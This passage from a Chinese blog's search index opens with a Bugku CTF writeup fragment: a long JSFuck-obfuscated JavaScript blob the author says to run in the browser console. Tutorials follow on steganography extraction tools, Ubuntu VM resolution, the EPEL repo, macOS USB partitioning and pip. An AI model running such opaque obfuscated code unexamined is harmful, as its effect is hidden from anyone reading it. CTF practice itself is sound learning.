]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]])+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[])[+[]]+(+(!+[]+!+[]+[+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+[+!+[]])+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]) 放进浏览器控制台 slphp://filter]]></content>
      <categories>
        <category>CTF</category>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>Bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[隐写入门-工具篇]]></title>
    <url>%2Fblog%2Fpubli%2F2018%2F03%2F02%2F%E9%9A%90%E5%86%99%E5%85%A5%E9%97%A8-%E5%B7%A5%E5%85%B7%E7%AF%87</url>
    <content type="text"><![CDATA[CTF入门：隐写工具篇 参考http://www.bugku.com/thread-56-1-1.html 0x01 StegdetectStegdetect程序主要用于分析JPEG文件，可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息。 Stegdetect通过统计测试来分析图像文件中是否包含隐藏内容。它运行静态测试以判断隐藏的内容是否存在。此外，它还会尝试识别隐藏内容是通过哪个隐写工具嵌入的。 Stegdetect的主要选项如下: -q: 仅显示可能包含隐藏内容的图像 -n: 启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。 -s: 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。 -d: 打印带行号的调试信息。 -t: 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：-j: 检测图像中的信息是否是用jsteg嵌入的。-o: 检测图像中的信息是否是用outguess嵌入的。-p: 检测图像中的信息是否是用jphide嵌入的。-i: 检测图像中的信息是否是用invisible secrets嵌入的。 MacOS上安装请见：https://github.com/sokie/stegdetect 0x02 outguess执行以下命令解密：1$ outguess -r ‘/root/Desktop/angrybird.jpg’ -t 11.txt MacOS上安装下载自https://github.com/crorvick/outguess.git修改configure文件，将安装目录前缀设置为期望地址。 0x03 mp3stego主要用于mp3隐写使用：12$ encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3$ decode -X -P pass svega_stego.mp3 0x04 binwalk, dd, foremost命令binwalk主要用于分析隐写文件使用：123456$ binwalk baozou_new.jpgDECIMAL HEX DESCRIPTION-------------------------------------------------------------------------------------------------------------------0 0x0 JPEG image data, JFIF standard 1.014308 0x10D4 Zip encrypted archive data, at least v2.0 to extract, compressed size: 8890, uncompressed size: 9990, name: "qr.png" 可以看出 0x10D4位置后是zip文件。 MacOS上安装1$ brew install binwalk dd主要用于提取文件1234$ dd if=baozou_new.jpg of=2.zip bs=1 skip=43089065+0 records in9065+0 records out9065 bytes (9.1 kB) copied, 0.0475933 s, 190 kB/s 安装系统自带 foremostforemost命令同样可以达到效果：1foremost -v -i baozou_new.jpg -o /root/Desktop/xx 支持恢复如下格式：avi, bmp, dll, doc, exe, gif, htm, jar, jpg, mbd, mov, mpg, pdf, png, ppt, rar, rif, sdw, sx, sxc, sxi,sxw, vis, wav, wmv, xls, zip。MacOS上安装1$ brew install foremost 0x05 F5-steganography123$ git clone https://github.com/matthewgao/F5-steganography$ cd F5-steganography$ java Extract ../123456.jpg -p 123456 后会生成output.txt文件，里面就有flag了 0x06 steghide官网地址：http://steghide.sourceforge.net/documentation.php12345# 在文件中隐藏数据$ steghide –embed -cf /root/Desktop/1111.jpg -ef /root/Desktop/embeddate# 检查图片中隐藏的信息$ steghide info /root/Desktop/1111.jpg$ steghide extract -sf background.jpg MacOS上安装没有安装上]]></content>
      <categories>
        <category>CTF</category>
        <category>隐写</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>隐写</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[虚拟机中调整Ubuntu Server分辨率]]></title>
    <url>%2Fblog%2Fpubli%2F2018%2F01%2F24%2F%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E8%B0%83%E6%95%B4Ubuntu-Server%E5%88%86%E8%BE%A8%E7%8E%87</url>
    <content type="text"><![CDATA[引自：调整虚拟机中Ubuntu Server 屏幕分辨率 打开grub文件:$ sudo vi /etc/default/grub 修改参数GRUB_CMDLINE_LINUX的值:GRUB_CMDLINE_LINUX=&quot;vga=0x317&quot;参数值参考下图： 显存 640x480 800x600 1024x768 1280x1024 256 0x301 0x303 0x305 0x307 32k 0x310 0x313 0x316 0x319 64k 0x311 0x314 0x317 0x31A 16M 0x312 0x315 0x318 0x31B $ sudo update-grub $ sudo reboot]]></content>
      <categories>
        <category>Ubuntu Server</category>
        <category>配置</category>
      </categories>
      <tags>
        <tag>Ubuntu Server</tag>
        <tag>分辨率调整</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何在centOS上开启EPEL仓库]]></title>
    <url>%2Fblog%2Fpubli%2F2018%2F01%2F24%2F%E5%A6%82%E4%BD%95%E5%9C%A8centOS%E4%B8%8A%E5%BC%80%E5%90%AFEPEL%E4%BB%93%E5%BA%93</url>
    <content type="text"><![CDATA[引自：How to Enable EPEL Repository for RHEL/CentOS 7.x/6.x/5.x 0x01 什么是EPELEPEL (Extra Packages for Enterprise Linux) 是一个Fedora团队提供的开源的基于免费社区的代码仓库项目。Fedora团队为Linux发行版（RHEL，CentOS，Scientific Linux）提供高质量的软件包。Epel本身并不是RHEL或者CentOS的一部分，但是他为这些发行版Linux提供了很多开源软件包，在网络、系统管理、编程、监控方面都有设计。多数的epel包由Fedora repo维护。 0x02 为什么要使用EPEL EPEL提供了很多可以通过yum安装的开源软件包。 EPEL完全开源免费。 没有兼容性问题。 所有的包都由Fedora repo维护。 0x03 如何在RHEL/CentOS 7.x/6.x/5.x上开启EPEL repo首先，使用wget下载epel相关文件，在使用RPM开启EPEL repo。根据个人系统型号选用下面一种方法（应使用root账户）。 RHEL/CentOS 7 64 Bit123## RHEL/CentOS 7 64-Bit ### wget http://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm# rpm -ivh epel-release-latest-7.noarch.rpm RHEL/CentOS 6 32-64 Bit1234567## RHEL/CentOS 6 32-Bit ### wget http://dl.fedoraproject.org/pub/epel/6/i386/epel-release-6-8.noarch.rpm# rpm -ivh epel-release-6-8.noarch.rpm## RHEL/CentOS 6 64-Bit ### wget http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm# rpm -ivh epel-release-6-8.noarch.rpm 0x04 如何确认repo已经启用运行命令：1# yum repolist 样例输出： Loaded plugins: downloadonly, fastestmirror, priorities Loading mirror speeds from cached hostfile * base: centos.aol.in * epel: ftp.cuhk.edu.hk * extras: centos.aol.in * rpmforge: be.mirror.eurid.eu * updates: centos.aol.in Reducing CentOS-5 Testing to included packages only Finished 1469 packages excluded due to repository priority protections repo id repo name status base CentOS-5 - base 2,718+7 epel Extra Packages for Enterprise Linux 5 - i386 4,320+1,408 extras CentOS-5 - extras 229+53 rpmforge Red Hat Enterprise 5 - RPMforge.net - dag 11,251 repolist: 19,075 0x05 如何使用EPEL repo使用yum命令搜索安装软件包。比如我们在epel repo中搜索Zabbix包，让我们来看看它是否在epel中。1# yum --enablerepo=epel info zabbix 样例输出： Available Packages Name : zabbix Arch : i386 Version : 1.4.7 Release : 1.el5 Size : 1.7 M Repo : epel Summary : Open-source monitoring solution for your IT infrastructure URL : http://www.zabbix.com/ License : GPL Description: ZABBIX is software that monitors numerous parameters of a network.然后我们就可以利用epel repo选项–enablerepo=epel安装Zabbix。1# yum --enablerepo=epel install zabbix 注意！ EPEL配置文件在目录：/etc/yum.repos.d/epel.repo。 这样你就可以通过epel安装很多高质量应用了。]]></content>
      <categories>
        <category>centOS</category>
        <category>repo</category>
      </categories>
      <tags>
        <tag>centOS</tag>
        <tag>EPEL repo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MacOS上U盘分区]]></title>
    <url>%2Fblog%2Fpubli%2F2018%2F01%2F24%2FMacOS%E4%B8%8AU%E7%9B%98%E5%88%86%E5%8C%BA</url>
    <content type="text"><![CDATA[1$ diskutil partitionDisk /dev/disk2 3 MS-DOS DOS 20G ExFAT linux_kali_1 20G ExFAT linux_kali_2 24G 在使用前需要知道自己的U盘设备号，比如/dev/disk2，紧接着的数字是分区数目，然后是格式、分区名称、分区大小。利用diskutil list查看磁盘设备。 P.S.笔者设备：macOS High Sierra 10.13.2MacBook Pro(15-inch, 2016)]]></content>
      <categories>
        <category>Mac使用</category>
        <category>磁盘工具</category>
      </categories>
      <tags>
        <tag>MacOS</tag>
        <tag>U盘分区</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mac-pip-install]]></title>
    <url>%2Fblog%2Fpubli%2F2018%2F01%2F23%2Fmac-pip-install</url>
    <content type="text"><![CDATA[MacOS系统中pip install 时常出现Permission Denied的情况，可以采用以下方式解决问题。1$ pip install --user &lt;package name&gt; 可以在安装python模块时按情况使用--upgrade --ignore-installed选项。]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>MacOS</tag>
        <tag>Python</tag>
        <tag>pip install</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Begin]]></title>
    <url>%2Fblog%2Fpubli%2F2018%2F01%2F23%2FBegin</url>
